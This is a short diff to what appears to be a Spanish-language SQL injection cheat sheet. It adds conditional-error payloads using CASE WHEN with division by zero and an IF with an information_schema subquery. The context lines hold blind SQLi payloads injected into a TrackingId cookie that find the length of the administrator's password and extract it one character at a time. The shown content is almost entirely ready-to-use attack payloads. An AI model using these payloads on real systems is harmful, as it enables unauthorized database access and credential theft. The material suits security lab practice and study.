@@ -228,7 +228,11 @@ A través de un operador lógico(=,>,<, etc), se genera una consulta para verifi
   TrackingId=xyz' AND (SELECT 'x' FROM users WHERE username='administrator' and LENGTH(password)=$1$)='x            =>Obtiene la longitud de un parametro
   TrackingId=xyz' AND (SELECT SUBSTRING(password,$1$,1) FROM users WHERE username='administrator')='$a$             =>Enumera un parametro
 
+A través de un CASE
+  TrackingId=xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
 
+A traves de un IF
+  TrackingId=xyz' AND (SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a'))
 
 ```
 
